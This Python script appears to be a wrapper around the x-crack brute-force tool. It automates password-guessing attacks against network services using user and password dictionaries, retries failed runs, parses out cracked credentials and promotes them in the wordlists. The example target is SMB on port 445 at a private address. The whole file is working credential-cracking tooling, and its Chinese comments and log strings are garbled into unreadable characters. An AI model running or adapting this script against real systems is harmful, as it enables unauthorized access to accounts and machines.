# -*- coding: cp936 -*-
import os
import re
import logging
# log
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
handler = logging.FileHandler(os.path.basename(__file__)[:-3]+".log", mode='a')
formatter = logging.Formatter("%(asctime)s -  %(levelname)s - %(message)s")
handler.setFormatter(formatter)
logger.addHandler(handler)
# log

def PwdCrack(ip, port, serve, login='', pwd=''):
    '''
        ����:
            �Ը�����ip�;���������������ƣ����У������Ƶ�һ�β��ɹ��ٱ���һ�Σ������ر��ƽ����
            �����п�ָ�������û����Ϳ���Ҳ�ɲ�ָ����ÿ�ν���ssh���ӳ�ʱʱ��Ĭ��Ϊ10���ӡ�
        input:
            ip���˿ںţ�����Э��(, ָ���û���, ����)
        output:
            [ip,�û���,����]
    '''
    iplist = 'iplist.txt'
    loginlist = 'user.dic'
    passwordlist = 'pass.dic'

    ip_port_serve= '{0}:{1}|{2}'.format(ip, port, serve)
    if os.path.exists(iplist):
        os.remove(iplist)
    with open(iplist, 'w+') as f:
        f.writelines(ip_port_serve)
    if login:
        newdic = 'spuser.dic'
        with open(newdic, 'w+') as f:
            f.writelines(login)
        loginlist = newdic
    if pwd:
        newdic = 'sppwd.dic'
        with open(newdic, 'w+') as f:
            f.writelines(pwd)
        passwordlist = newdic
    ip_cmd = '-i {0}'.format(iplist)
    login_cmd = '-u ' + loginlist
    pwd_cmd = '-p {0}'.format(passwordlist)
    splitline = '-'*30
    cmd = ' '.join(['./x-crack-linux32', 'scan', ip_cmd, login_cmd, pwd_cmd]).strip()
    re_cmp = 'Ip: (?P<ip>.+?), Port: {0}, Protocol: \\[{1}\\], Username: (?P<user>.+?), Password: (?P<pass>.+?)\n'.format(port, serve.upper())
    logger.info(splitline+'��ʼ�״α���'+splitline)
    user_pass = executeXCrack(cmd, re_cmp)
    if user_pass:
        logger.info(splitline+'�״α��Ƴɹ�'+splitline)
    else:
        logger.info(splitline+'�״α���δ�ɹ�����ʼ�ڶ��α���'+splitline)
        user_pass = executeXCrack(cmd, re_cmp)
        if not user_pass:
            logger.info(splitline+'�ڶ��α���ʧ�ܣ������˳�'+splitline)
            user_pass = ''
        else:
            logger.info(splitline+'�ڶ��α��Ƴɹ�'+splitline)
    if login:
        os.remove(loginlist)
    if pwd:
        os.remove(passwordlist)
    loginlist = 'user.dic'
    passwordlist = 'pass.dic'
    for cc in user_pass:
        insertlist(cc[1], loginlist)
        insertlist(cc[2], passwordlist)

    return user_pass


def executeXCrack(cmd, cmp):
    '''
        ����:
            ִ�б������ɸѡ���Ƴ����û����Ϳ���
        input:
            ִ��x-crack���ƥ��ģʽ
        output:
            ɸѡ���
    '''
    r = os.popen(cmd).read()
    logger.info('��������{0}'.format(r))
    cmp_obj = re.compile(cmp)
    user_pass = cmp_obj.findall(r)

    logger.info('���ƽ����', user_pass)
    return user_pass


def insertlist(value, diclist):
    """
        ����:
            �����Ƴ����û����������������ֵ����ǰ��,������һ�α���
        input:
            ��Ҫ�����ֵ, �ֵ�·��
        output:
    """
    with open(diclist, 'r+') as f:
        newf = f.readlines()
        for fr in newf:
            if fr == value+'\n':
                id = newf.index(fr)
                newf = newf[:id] + newf[id+1:]
                break
        f.seek(0, 0)
        f.writelines(value+'\n')
        f.writelines(newf)


if __name__ == '__main__':
    login = 'scx'
    port = '445'
    ip = '192.168.222.136'
    serve = 'smb'
    rs = PwdCrack(ip, port, serve)
    logger.info(rs)